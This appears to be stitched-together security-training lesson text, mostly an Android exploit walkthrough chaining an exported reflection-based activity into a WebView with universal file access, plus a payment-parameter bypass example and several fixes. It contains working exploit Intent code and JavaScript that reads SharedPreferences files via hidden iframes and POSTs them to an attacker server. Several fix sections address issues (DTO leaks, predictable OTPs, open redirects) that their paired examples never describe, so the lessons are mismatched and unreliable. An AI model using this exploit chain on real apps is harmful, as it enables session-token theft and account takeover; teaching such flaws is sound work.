lesson.walkthrough:
RECON
Step 1: Open the app’s AndroidManifest.xml and look for activities with android:exported="true". Definition: an AndroidManifest is a file that describes app components; an exported activity can be started by other apps.
Step 2: Decompile the APK (e.g., with jadx) and inspect the exported BootActivity code. Definition: decompile means converting compiled bytecode back to readable source. The code shows:
public static final Class<?> resolveClass(String className) { try { return Class.forName(className); } catch (ClassNotFoundException unused) { return null; } }
Why: Class.forName() loads a class by name at runtime (reflection) without validation.

EXPLOITATION
Step 3: Identify an internal activity that hosts a WebView with dangerous settings. Definition: a WebView is a component that renders web pages inside an app. The AmexWebViewActivity calls:
settings.setAllowUniversalAccessFromFileURLs(true);
Why: This setting disables the same‑origin policy, allowing file:// URLs to be accessed from other schemes.
Step 4: Write a small Android app (zero permissions) that creates an Intent. Definition: an Intent is a message object used to request an action from another app.
Intent intent = new Intent();
Why: This creates an empty Intent object.
Step 5: Point the Intent to the target package and the exported BootActivity.
intent.setClassName("com.redacted.app", "com.redacted.app.core.activity.BootActivity");
Why: setClassName tells Android which app (package) and which component (class) should receive the Intent.
Step 6: Add the extra that tells BootActivity which internal class to launch.
intent.putExtra("extraDeepLinkClass", "com.redacted.app.webview.AmexWebViewActivity");
Why: putExtra attaches a key‑value pair to the Intent; the key matches what BootActivity reads.
Step 7: Add the extra that supplies the attacker‑controlled content URI.
intent.putExtra("extra-web-view-activity-url", "content://com.attacker.poc.provider/exploit");
Why: This URI will be loaded by the WebView; content:// identifies data served by a ContentProvider (a component that shares data between apps).
Step 8: Launch the activity.
startActivity(intent);
Why: startActivity tells Android to start the component described by the Intent.
Step 9: BootActivity receives the Intent, calls resolveClass() → Class.forName("com.redacted.app.webview.AmexWebViewActivity"), and starts that activity, forwarding all extras.
Why: The reflection call loads the attacker‑chosen class and the system launches it.
Step 10: AmexWebViewActivity receives the extra‑web‑view‑activity‑url and loads it into its WebView.
Why: The WebView now navigates to the attacker’s content:// URL.
Step 11: The attacker’s ContentProvider returns an HTML page containing JavaScript that creates hidden iframes pointing to internal files:
var P = "/data/data/com.redacted.app/shared_prefs/";
["app_preferences.xml", "AppPrefs.xml"].forEach(function(file) {
  var ifr = document.createElement("iframe");
  ifr.style.display = "none";
  ifr.src = "file://" + P + file;
  ifr.onload = function() {
    var d = ifr.contentDocument.documentElement.outerHTML;
    fetch(SERVER + "/collect", {method: "POST", body: JSON.stringify({path: file, data: d})});
  };
  document.body.appendChild(ifr);
});
Why: <iframe> embeds another page; src="file://…" tells the browser to load a file from the device’s filesystem. Because universal file access is enabled, the WebView can read these files.
Step 12: The fetch() call sends the file contents to the attacker’s server.
Why: fetch performs an HTTP POST request; the body contains the file path and its XML data.

IMPACT
Step 13: The attacker receives the SharedPreferences XML files, which contain session tokens and user data, enabling account takeover.
Why: SharedPreferences often store sensitive information; reading them compromises the user’s account.

lesson.example:
**Fictional target:** target.example
**Vulnerable snippet (exported activity):**
public class EntryActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String cls = getIntent().getStringExtra("className");
        try {
            Class<?> c = Class.forName(cls); // <-- no validation
            Intent i = new Intent(this, c);
            i.putExtras(getIntent());
            startActivity(i);
        } catch (Exception e) { }
    }
}
**Vulnerable WebView activity:**
public class InsecureWebViewActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WebView w = new WebView(this);
        WebSettings s = w.getSettings();
        s.setAllowUniversalAccessFromFileURLs(true); // <-- dangerous
        String url = getIntent().getStringExtra("url");
        w.loadUrl(url);
        setContentView(w);
    }
}
**Exploit code (run in a separate app):**
Intent i = new Intent();
 i.setClassName("target.example", "target.example.EntryActivity");
 i.putExtra("className", "target.example.InsecureWebViewActivity");
 i.putExtra("url", "content://attacker.provider/page");
 startActivity(i);
**Why it works:** The EntryActivity loads any class name via Class.forName, so the attacker can launch InsecureWebViewActivity. That activity loads a content:// page supplied by the attacker. Because universal file access is enabled, the page can embed hidden iframes that read file:///data/data/target.example/shared_prefs/*.xml and POST them to the attacker’s server.

lesson.fix:
Remove the exported flag from BootActivity or restrict it with android:exported="false" if external launches are not required. If it must stay exported, validate the incoming class name against an allow‑list of known safe activities before calling Class.forName, e.g.,
if (ALLOWED.contains(className)) { Class.forName(className); } else { reject(); }
In the WebView activity, disable the dangerous setting:
settings.setAllowUniversalAccessFromFileURLs(false);
Optionally also call settings.setAllowFileAccessFromFileURLs(false) and settings.setAllowFileAccess(false) to enforce the default same‑origin policy. These changes prevent arbitrary internal activity launches and block file:// reads from WebView content, eliminating the data‑exfiltration path.

To fix this, developers should use Data Transfer Objects (DTOs), which are specific code structures that only include the fields intended for the user. Instead of returning a whole 'User' object from the database, create a 'UserPublicProfile' object that only contains the name and bio. Additionally, ensure all debug modes are disabled in production and that error messages are generic (e.g., 'An error occurred') rather than detailed. 

Example of a secure fix in code:
public UserDTO getProfile(Long id) {
  User user = userRepository.findById(id);
  return new UserDTO(user.getUsername(), user.getBio()); // Only return safe fields
}

lesson.example:
Suppose a fictional site 'target.example' has a checkout page. When a user pays, the bank redirects them to 'target.example/success?paid=true'. A beginner researcher sees this and tries to access that URL directly without paying. If the code looks like this: 

if (url.params.get('paid') === 'true') { 
  database.updateOrder(orderId, 'PAID'); 
}

The researcher can simply type the URL into their browser to get a free item. The attack request would be: 
GET /success?paid=true HTTP/1.1
Host: target.example

This works because the server trusts the 'paid=true' parameter (a piece of data in the URL) provided by the user's browser instead of asking the bank's server if the money was actually received.

lesson.fix:
To fix this, first restrict access to UAT environments using a VPN or IP whitelisting so they are not public. Second, replace predictable OTPs with cryptographically secure random codes and implement rate limiting (restricting the number of attempts). Finally, implement server-side payment verification using webhooks. 

Example fix in Node.js:
app.post('/webhook/payment', (req, res) => {
  const signature = req.headers['x-razorpay-signature'];
  if (verifySignature(req.body, signature)) {
    if (req.body.status === 'captured') {
      db.orders.update({ id: req.body.order_id }, { status: 'PAID' });
    }
  }
});

The most secure way to handle redirects is to use relative paths instead of absolute URLs. For example, instead of redirecting to 'https://example.com/dashboard', redirect to '/dashboard'. If you must allow external redirects, implement a strict allowlist of permitted domains. Never trust the user input directly; instead, parse the URL and verify that the host matches your approved list. 

Example of a secure fix in Node.js:
```javascript
const allowedHosts = ['target.example', 'api.target.example'];
const url = new URL(req.query.url);
if (allowedHosts.includes(url.hostname)) {
  res.redirect(url.href);
} else {
  res.status(400).send('Invalid redirect destination');
}
```

